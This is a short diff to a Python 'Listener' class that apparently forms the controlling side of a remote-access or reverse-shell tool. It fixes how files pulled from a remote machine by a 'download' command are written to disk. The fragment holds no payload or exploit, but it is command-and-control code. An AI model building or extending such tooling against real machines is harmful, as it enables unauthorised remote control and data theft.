@@ -48,7 +48,7 @@ class Listener:
             #print(command)
             result = self.execute_remotely(command, buffer_size)
             if command[0] == "download":
-                result = self.write_file(result)
+                result = self.write_file(command[1], result)
             print(result)
             
     def write_file(self, path, content):
